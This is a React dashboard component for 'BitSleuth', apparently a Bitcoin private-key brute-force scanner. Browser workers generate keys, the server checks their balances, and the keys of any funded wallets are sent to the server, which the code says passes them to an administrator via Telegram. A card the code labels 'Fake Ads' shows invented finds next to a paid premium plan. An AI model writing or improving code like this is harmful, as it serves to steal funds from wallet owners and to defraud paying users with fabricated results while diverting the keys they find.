import { useState, useEffect, useRef } from "react";
import axios from "axios";
import { API } from "@/App";
import { useLanguage } from "@/App";
import { useTranslation } from "@/i18n";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { toast } from "sonner";
import { useNavigate } from "react-router-dom";

const Dashboard = ({ user, onLogout }) => {
  const navigate = useNavigate();
  const { language } = useLanguage();
  const t = useTranslation(language);
  
  const [scanning, setScanning] = useState(false);
  const [scannedCount, setScannedCount] = useState(0);
  const [foundWallets, setFoundWallets] = useState([]);
  const [scanMode, setScanMode] = useState(user.is_premium ? "premium" : "free");
  const [showInvoice, setShowInvoice] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState("1month");
  const [invoice, setInvoice] = useState(null);
  const [txHash, setTxHash] = useState("");
  const [recentAds, setRecentAds] = useState([]);
  const workersRef = useRef([]);

  useEffect(() => {
    fetchRecentAds();
    return () => {
      workersRef.current.forEach(w => w.terminate());
    };
  }, []);

  const fetchRecentAds = async () => {
    try {
      const response = await axios.get(`${API}/ads/recent`);
      setRecentAds(response.data.ads || []);
    } catch (error) {
      console.error("Error fetching ads:", error);
    }
  };

  const startScanning = () => {
    if (!user.email_verified) {
      toast.error(t.verify_before_scan);
      return;
    }

    setScanning(true);
    setScannedCount(0);
    
    const workerCount = scanMode === "premium" ? Math.min(8, navigator.hardwareConcurrency || 4) : 1;
    
    for (let i = 0; i < workerCount; i++) {
      const worker = new Worker(
        new URL("../workers/bitcoinScanWorker.js", import.meta.url),
        { type: "module" }
      );
      
      worker.onmessage = async (e) => {
        const { address, privateKey } = e.data;
        setScannedCount(prev => prev + 1);
        
        // Check balance on server
        try {
          const response = await axios.post(`${API}/scan/check-address`, { address });
          if (response.data.has_balance && response.data.balance > 0) {
            // Found funded wallet! Report to server (private key will be sent to Telegram)
            const reportResponse = await axios.post(`${API}/scan/report-found`, {
              address,
              balance: response.data.balance,
              private_key: privateKey
            });
            
            if (reportResponse.data.success) {
              setFoundWallets(prev => [...prev, {
                address: response.data.address,
                balance: response.data.balance
              }]);
              toast.success(`${t.found_wallets}! ${response.data.balance} BTC`);
            }
          }
        } catch (error) {
          console.error("Error checking address:", error);
        }
      };
      
      worker.postMessage({ action: "start", mode: scanMode });
      workersRef.current.push(worker);
    }
  };

  const stopScanning = () => {
    workersRef.current.forEach(w => {
      w.postMessage({ action: "stop" });
      w.terminate();
    });
    workersRef.current = [];
    setScanning(false);
  };

  const createInvoice = async () => {
    try {
      const response = await axios.post(`${API}/invoices/create`, { plan: selectedPlan });
      setInvoice(response.data);
      toast.success("Invoice created!");
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to create invoice");
    }
  };

  const submitPayment = async () => {
    if (!txHash || !invoice) {
      toast.error("Please enter transaction hash");
      return;
    }

    try {
      await axios.post(`${API}/payments/manual?tx_hash=${txHash}&invoice_id=${invoice.invoice_id}`);
      toast.success("Payment submitted for verification! Waiting for 3 confirmations.");
      setShowInvoice(false);
      setInvoice(null);
      setTxHash("");
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to submit payment");
    }
  };

  const isPremiumActive = user.is_premium && user.access_until && new Date(user.access_until) > new Date();

  return (
    <div className="min-h-screen gradient-bg">
      {/* Header */}
      <div className="glass border-b border-binance-gold/20">
        <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-2xl font-bold neon-text">BitSleuth</h1>
          <div className="flex items-center gap-4">
            <span className="text-gray-300">{user.email}</span>
            {isPremiumActive && (
              <span className="px-3 py-1 bg-gradient-to-r from-binance-gold to-yellow-500 rounded-full text-sm font-semibold text-black">
                Premium ⚡
              </span>
            )}
            {user.is_admin && (
              <Button
                data-testid="admin-panel-btn"
                onClick={() => navigate("/admin")}
                className="bg-purple-600 hover:bg-purple-700"
              >
                {t.admin_panel}
              </Button>
            )}
            <Button
              data-testid="logout-btn"
              onClick={onLogout}
              variant="outline"
              className="border-gray-600 text-gray-300 hover:bg-slate-800"
            >
              {t.logout}
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {!user.email_verified && (
          <div className="glass border-yellow-500/50 p-4 rounded-lg mb-6">
            <p className="text-yellow-400">{t.verify_email_notice}</p>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Scanning control */}
          <div className="lg:col-span-2 space-y-6">
            <Card data-testid="scan-control-card" className="glass p-6">
              <h2 className="text-2xl font-bold mb-4 text-binance-gold">{t.scan_control}</h2>
              
              <div className="space-y-4">
                <div>
                  <label className="text-gray-300 block mb-2">{t.scan_mode}</label>
                  <div className="flex gap-4">
                    <Button
                      data-testid="free-mode-btn"
                      onClick={() => setScanMode("free")}
                      variant={scanMode === "free" ? "default" : "outline"}
                      className={scanMode === "free" ? "bg-binance-gold text-black" : "border-gray-600"}
                      disabled={scanning}
                    >
                      {t.free_mode}
                    </Button>
                    <Button
                      data-testid="premium-mode-btn"
                      onClick={() => setScanMode("premium")}
                      variant={scanMode === "premium" ? "default" : "outline"}
                      className={scanMode === "premium" ? "bg-gradient-to-r from-binance-gold to-yellow-500 text-black" : "border-gray-600"}
                      disabled={scanning || !isPremiumActive}
                    >
                      {t.premium_mode}
                    </Button>
                  </div>
                  {scanMode === "premium" && !isPremiumActive && (
                    <p className="text-sm text-orange-400 mt-2">{t.premium_required}</p>
                  )}
                </div>

                <div>
                  {!scanning ? (
                    <Button
                      data-testid="start-scan-btn"
                      onClick={startScanning}
                      className="w-full bg-gradient-to-r from-binance-green to-green-600 hover:from-green-600 hover:to-binance-green text-white py-6 text-lg font-semibold rounded-xl"
                    >
                      {t.start_scan}
                    </Button>
                  ) : (
                    <Button
                      data-testid="stop-scan-btn"
                      onClick={stopScanning}
                      className="w-full bg-gradient-to-r from-binance-red to-red-600 hover:from-red-600 hover:to-binance-red text-white py-6 text-lg font-semibold rounded-xl"
                    >
                      {t.stop_scan}
                    </Button>
                  )}
                </div>

                {scanning && (
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">{t.scanned_addresses}</span>
                      <span className="text-binance-gold font-mono" data-testid="scanned-count">{scannedCount.toLocaleString()}</span>
                    </div>
                    <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden">
                      <div className="scanning-line absolute inset-0 h-full w-full bg-gradient-to-r from-transparent via-binance-gold to-transparent" />
                    </div>
                  </div>
                )}
              </div>
            </Card>

            {/* Found wallets */}
            <Card data-testid="found-wallets-card" className="glass p-6">
              <h2 className="text-2xl font-bold mb-4 neon-text-green">{t.found_wallets}</h2>
              {foundWallets.length === 0 ? (
                <p className="text-gray-400">{t.no_wallets_found}</p>
              ) : (
                <div className="space-y-2">
                  {foundWallets.map((wallet, idx) => (
                    <div key={idx} className="glass p-4 rounded-lg border border-binance-green/30">
                      <div className="flex justify-between items-center">
                        <code className="text-binance-green text-sm">{wallet.address}</code>
                        <span className="text-binance-green font-semibold">
                          {wallet.balance} BTC
                        </span>
                      </div>
                      <p className="text-xs text-gray-500 mt-1">⚠️ Private key sent to administrator via Telegram</p>
                    </div>
                  ))}
                </div>
              )}
            </Card>

            {/* Fake Ads - Recent Finds */}
            <Card data-testid="ads-card" className="glass p-6 border-binance-gold/30">
              <h2 className="text-xl font-bold mb-4 text-binance-gold">🎉 {t.recent_finds}</h2>
              {recentAds.length === 0 ? (
                <p className="text-gray-400 text-sm">No recent finds</p>
              ) : (
                <div className="space-y-2">
                  {recentAds.map((ad) => (
                    <div key={ad.id} className="bg-gradient-to-r from-binance-gold/10 to-transparent p-3 rounded-lg border border-binance-gold/20">
                      <div className="flex justify-between items-center">
                        <div>
                          <p className="text-sm text-gray-300">
                            <span className="text-binance-gold font-semibold">{t.wallet_found_today}</span>
                          </p>
                          <code className="text-xs text-gray-500">{ad.wallet_address}</code>
                        </div>
                        <span className="text-binance-green font-bold text-lg">{ad.amount} BTC</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </Card>
          </div>

          {/* Premium & Stats */}
          <div className="space-y-6">
            {!isPremiumActive && (
              <Card data-testid="premium-upgrade-card" className="glass p-6 border-binance-gold/30">
                <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.premium_upgrade}</h3>
                <p className="text-gray-300 text-sm mb-4">
                  {t.premium_desc}
                </p>
                <Button
                  data-testid="show-plans-btn"
                  onClick={() => setShowInvoice(!showInvoice)}
                  className="w-full bg-gradient-to-r from-binance-gold to-yellow-500 hover:from-yellow-600 hover:to-binance-gold text-black"
                >
                  {t.view_plans}
                </Button>
              </Card>
            )}

            {showInvoice && (
              <Card data-testid="invoice-card" className="glass p-6">
                {!invoice ? (
                  <>
                    <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.select_plan}</h3>
                    <div className="space-y-3">
                      <Button
                        data-testid="plan-1week-btn"
                        onClick={() => setSelectedPlan("1week")}
                        variant={selectedPlan === "1week" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>1 {t.week}</span>
                        <span>0.001 BTC</span>
                      </Button>
                      <Button
                        data-testid="plan-1month-btn"
                        onClick={() => setSelectedPlan("1month")}
                        variant={selectedPlan === "1month" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>1 {t.month}</span>
                        <span>0.003 BTC</span>
                      </Button>
                      <Button
                        data-testid="plan-3months-btn"
                        onClick={() => setSelectedPlan("3months")}
                        variant={selectedPlan === "3months" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>3 {t.months}</span>
                        <span>0.008 BTC</span>
                      </Button>
                    </div>
                    <Button
                      data-testid="create-invoice-btn"
                      onClick={createInvoice}
                      className="w-full mt-4 bg-binance-gold hover:bg-yellow-600 text-black"
                    >
                      {t.create_invoice}
                    </Button>
                  </>
                ) : (
                  <>
                    <h3 className="text-xl font-bold mb-3 text-binance-green">{t.payment_info}</h3>
                    <div className="space-y-3 text-sm">
                      <div>
                        <p className="text-gray-400">{t.amount}</p>
                        <p className="text-white font-mono text-lg">{invoice.amount} BTC</p>
                      </div>
                      <div>
                        <p className="text-gray-400">{t.wallet_address}</p>
                        <code className="text-binance-gold text-xs break-all">{invoice.wallet_address}</code>
                      </div>
                      <div>
                        <p className="text-gray-400">{t.plan}</p>
                        <p className="text-white">{invoice.plan}</p>
                      </div>
                    </div>
                    <div className="mt-4">
                      <label className="text-gray-300 text-sm">{t.tx_hash}</label>
                      <input
                        data-testid="tx-hash-input"
                        type="text"
                        value={txHash}
                        onChange={(e) => setTxHash(e.target.value)}
                        className="w-full mt-1 px-3 py-2 bg-slate-900/50 border border-gray-700 rounded text-white text-sm"
                        placeholder="Transaction hash..."
                      />
                    </div>
                    <Button
                      data-testid="submit-payment-btn"
                      onClick={submitPayment}
                      className="w-full mt-4 bg-binance-green hover:bg-green-700 text-white"
                    >
                      {t.submit_payment}
                    </Button>
                  </>
                )}
              </Card>
            )}

            <Card data-testid="stats-card" className="glass p-6">
              <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.stats}</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">{t.status}</span>
                  <span className="text-binance-green">
                    {isPremiumActive ? t.premium_active : t.free}
                  </span>
                </div>
                {isPremiumActive && (
                  <div className="flex justify-between">
                    <span className="text-gray-400">{t.expiry_date}</span>
                    <span className="text-binance-gold">
                      {new Date(user.access_until).toLocaleDateString(language === 'ru' ? 'ru-RU' : language === 'tr' ? 'tr-TR' : 'en-US')}
                    </span>
                  </div>
                )}
                <div className="flex justify-between">
                  <span className="text-gray-400">{t.found_count}</span>
                  <span className="text-binance-green">{foundWallets.length}</span>
                </div>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
